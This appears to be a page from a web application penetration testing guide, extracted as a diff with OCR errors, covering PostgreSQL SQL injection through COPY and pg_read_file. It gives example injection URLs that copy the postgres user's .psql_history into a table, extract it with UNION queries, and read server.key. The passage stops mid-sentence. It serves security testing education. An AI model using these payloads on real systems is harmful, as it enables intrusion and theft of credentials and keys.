@@ -1,0 +1,33 @@
+METHOD / ANSWER:
+127
+Web Application Penetration Testing
+COPY:
+This operator copies data between a file and a table. The Post-
+greSQL engine accesses the local file system as the postgres user.
+Example
+/store.php?id=1; CREATE TABLE file_store(id serial, data
+text)--
+/store.php?id=1; COPY file_store(data) FROM ‘/var/lib/post-
+gresql/.psql_history’--
+Data should be retrieved by performing a UNION Query SQL In-
+jection:
+« retrieves the number of rows previously added in file_store with
+COPY statement
+» retrieves a row ata time with UNION SQL Injection
+Example:
+/store.php?id=1 UNION ALL SELECT NULL, NULL, max(id)::-
+text FROM file_store LIMIT 1 OFFSET 1;--
+/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM
+file_ store LIMIT 1 OFFSET 1;--
+/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM
+file_store LIMIT 1 OFFSET 2;--
+/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM
+file_store LIMIT 1 OFFSET 11;--
+pg_read_file():
+This function was introduced in PostgreSQL 8.1 and allows one to
+read arbitrary files located inside DBMS data directory.
+Examples:
+» SELECT pg_read_file(‘server.key'0, 1000);
+Writing to a file
+By reverting the COPY statement, we can write to the local file
+syste
